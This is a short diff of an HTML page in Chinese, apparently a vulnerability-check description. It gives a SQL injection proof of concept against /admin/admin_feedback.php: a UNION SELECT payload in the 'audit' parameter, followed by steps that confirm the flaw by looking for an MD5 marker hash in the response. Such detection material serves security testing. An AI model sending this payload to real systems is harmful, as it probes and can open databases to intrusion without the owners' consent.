@@ -1,13 +1,9 @@
 <meta charset="UTF-8">
 <div>
-    <h3>SQL注入 URL: </h3>
-    <ul>
-        <p>/admin/admin_feedback.php</p>
-    </ul>
-    <h3>GET-payload: </h3>
-        <code>?act=report_list&audit=1%20union%20select%201,2,3,4,5,6,7,md5(c),9,10%23</code>
     <h3>验证过程</h3>
-    <p>先登录 /admin/admin_feedback.php, 拿到cookie</p>
-    <p>后再构造GET请求</p>
-    <p>查看response text 是否含有"c"的md5值 "4a8a08f09d37b73795649038408b5f33"</p>
+    <p>先访问</p>
+    <code>http://example.com/admin/admin_feedback.php</code>
+    <p>再访问</p>
+    <code>http://example.com/admin/admin_feedback.php?act=report_list&audit=1%20union%20select%201,2,3,4,5,6,7,md5(c),9,10%23</code>
+    <p>查看返回页面源码中是否有字符：4a8a08f09d37b73795649038408b5f33</p>
 </div>
